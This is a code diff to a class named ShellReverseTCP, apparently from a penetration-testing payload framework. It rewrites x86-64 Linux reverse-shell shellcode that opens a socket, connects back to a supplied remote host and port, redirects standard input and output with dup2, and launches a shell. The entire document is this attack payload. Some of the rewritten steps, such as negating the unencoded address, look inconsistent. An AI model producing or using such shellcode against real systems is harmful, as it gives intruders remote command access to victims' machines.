@@ -40,44 +40,40 @@ class ShellReverseTCP(HatAsm, HatVenom, Consts):
 
         shellcode = f"""
         start:
-            push 0x{rhost.hex()}
-            push word 0x{rport.hex()}
-            push word 2
-            push 42
-            push byte 16
-            push byte 41
-            push byte 1
-            push byte 2
-
+            push 41
+            pop rax
+            push 2
             pop rdi
+            push 1
             pop rsi
-            xor rdx, rdx
-            pop rax
+            cdq
             syscall
 
-            mov rdi, rax
-            pop rdx
-            pop rax
-            mov rsi, rsp
+            xchg edi, eax
+            mov rbx, 0x{rhost.hex()}{rport.hex()}0002
+            not rbx
+            push rbx
+            mov al, 42
+            push rsp
+            pop rsi
+            mov dl, 16
             syscall
 
-            xor rsi, rsi
+            push 3
+            pop rsi
 
         dup:
             mov al, 33
+            dec esi
             syscall
+            loopnz dup
 
-            inc rsi
-            cmp rsi, 2
-            jle dup
-
-            xor rax, rax
-            mov rdi, 0x{self.shell.hex()}
-            xor rsi, rsi
-            push rsi
-            push rdi
-            mov rdi, rsp
-            xor rdx, rdx
+            push rax
+            mov rbx, 0x{self.shell.hex()}
+            push rbx
+            push rsp
+            pop rdi
+            cdq
             mov al, 59
             syscall
         """
